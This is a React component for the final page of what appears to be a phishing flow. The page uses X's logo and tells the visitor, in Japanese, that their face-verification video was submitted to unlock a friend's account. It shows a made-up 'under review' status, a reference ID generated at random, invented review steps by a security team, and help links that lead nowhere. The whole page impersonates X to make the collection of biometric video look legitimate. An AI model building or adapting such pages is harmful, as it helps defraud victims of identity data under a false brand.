import { useNavigate } from 'react-router-dom'
import './Success.css'

function Success() {
  const navigate = useNavigate()

  return (
    <div className="success-page">
      <div className="success-container">
        {/* X Logo */}
        <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
          <g>
            <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
          </g>
        </svg>

        <div className="success-icon">
          <svg viewBox="0 0 24 24" width="80" height="80" fill="#00ba7c">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
          </svg>
        </div>

        <h1 className="success-title">認証を送信しました！</h1>
        
        <p className="success-description">
          友達を支援していただき、ありがとうございます！顔認証が正常に送信されました。
          セキュリティチームが24-48時間以内にお客様の提出内容を確認し、
          友達のアカウントのロックを解除いたします。
        </p>

        <div className="success-info">
          <div className="info-row">
            <span className="info-label">ステータス:</span>
            <span className="info-value pending">審査中</span>
          </div>
          <div className="info-row">
            <span className="info-label">送信日時:</span>
            <span className="info-value">{new Date().toLocaleString()}</span>
          </div>
          <div className="info-row">
            <span className="info-label">参照ID:</span>
            <span className="info-value">#{Math.random().toString(36).substr(2, 9).toUpperCase()}</span>
          </div>
        </div>

        <div className="success-steps">
          <h3>今後の流れ</h3>
          <ol>
            <li>セキュリティチームがお客様の顔認証動画を審査します</li>
            <li>アカウントロック解除リクエストを確認するため、お客様の本人確認を行います</li>
            <li>友達に結果をお知らせするメール通知が送信されます</li>
            <li>承認された場合、友達のアカウントアクセスが完全に復旧されます</li>
            <li>追加の認証が必要な場合、お客様または友達にご連絡いたします</li>
          </ol>
        </div>

        <button className="btn-done" onClick={() => navigate('/')}>
          ホームに戻る
        </button>

        <p className="support-text">
          サポートが必要ですか？<a href="#">ヘルプセンター</a>をご覧いただくか、<a href="#">サポートにお問い合わせ</a>ください
        </p>
      </div>
    </div>
  )
}

export default Success
